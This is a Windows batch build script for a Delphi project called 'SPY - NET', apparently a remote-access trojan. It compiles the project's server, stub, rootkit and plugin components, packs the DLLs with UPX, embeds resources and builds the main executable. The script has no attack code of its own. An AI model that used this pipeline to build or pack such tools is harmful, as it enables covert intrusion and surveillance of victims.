@echo ////////////////////////////////////////////////
@echo ////////////////  SPY - NET ////////////////////
@echo ////////////////////////////////////////////////
@echo.
@echo.
@echo.
@echo Antes de continuar, verificar se o DEBUG continua ativo
@echo.
@echo.
@echo.

@echo off

PAUSE

@echo off

del SpyNet.exe
del stub.exe
del sound.wav
del server.dll
del funcoes.dll
del rootkit.dll
del sqlite3.dll
del settings.res
del language.res
del profile.res
del stub.res
del server.res
del funcoes.res
del image.res
del sound.res
del geoip.res
del rootkit.res
del sqlite3.res

cd ..\Servidor\plugin\
C:\Progra~1\Borland\Delphi7\Bin\dcc32.exe funcoes.dpr
del *.~dpr
del *.dcu
del *.~pas
del *.~ddp
del *.~dfm
del *.ddp
cd..
cd..
cd .\Cliente


cd ..\Servidor\Server\
C:\Progra~1\Borland\Delphi7\Bin\dcc32.exe server.dpr
C:\Progra~1\Borland\Delphi7\Bin\dcc32.exe rootkit.dpr
del *.~dpr
del *.dcu
del *.~pas
del *.~ddp
del *.~dfm
del *.ddp
cd .\PLUGIN
del *.~dpr
del *.dcu
del *.~pas
del *.~ddp
del *.~dfm
del *.ddp
cd..
cd .\RootKIT
del *.~dpr
del *.dcu
del *.~pas
del *.~ddp
del *.~dfm
del *.ddp
cd..
cd..
cd..
cd .\Cliente

cd ..\Servidor\stub\
C:\Progra~1\Borland\Delphi7\Bin\dcc32.exe stub.dpr
del *.~dpr
del *.dcu
del *.~pas
del *.~ddp
del *.~dfm
del *.ddp
cd .\password\
del *.~dpr
del *.dcu
del *.~pas
del *.~ddp
del *.~dfm
del *.ddp
cd..
cd..
cd..
cd .\Cliente

cd .\Profiles
del novo*.ini
cd..

cd .\language
del Default.ini
cd..

cd .\Settings
del Settings.ini
cd..

UPX.exe -9 -f server.dll
UPX.exe -9 -f funcoes.dll
UPX.exe -9 -f rootkit.dll
C:\Progra~1\Borland\Delphi7\Bin\brcc32.exe language.rc
C:\Progra~1\Borland\Delphi7\Bin\brcc32.exe settings.rc
C:\Progra~1\Borland\Delphi7\Bin\brcc32.exe profile.rc
C:\Progra~1\Borland\Delphi7\Bin\brcc32.exe upx.rc
C:\Progra~1\Borland\Delphi7\Bin\brcc32.exe stub.rc
C:\Progra~1\Borland\Delphi7\Bin\brcc32.exe server.rc
C:\Progra~1\Borland\Delphi7\Bin\brcc32.exe funcoes.rc
C:\Progra~1\Borland\Delphi7\Bin\brcc32.exe image.rc
C:\Progra~1\Borland\Delphi7\Bin\brcc32.exe sound.rc
C:\Progra~1\Borland\Delphi7\Bin\brcc32.exe geoip.rc
C:\Progra~1\Borland\Delphi7\Bin\brcc32.exe rootkit.rc
C:\Progra~1\Borland\Delphi7\Bin\brcc32.exe sqlite3.rc
C:\Progra~1\Borland\Delphi7\Bin\dcc32.exe SpyNet.dpr
del *.~dpr
del *.dcu
del *.~pas
del *.~ddp
del *.~dfm
del *.ddp
del stub.exe
del server.dll
del funcoes.dll
del rootkit.dll
//////////////////////////////////////////////////////////UPX.exe -9 -f SpyNet.exe

cd ..\Units_em_comum\
del *.~dpr
del *.dcu
del *.~pas
del *.~ddp
del *.~dfm
del *.ddp
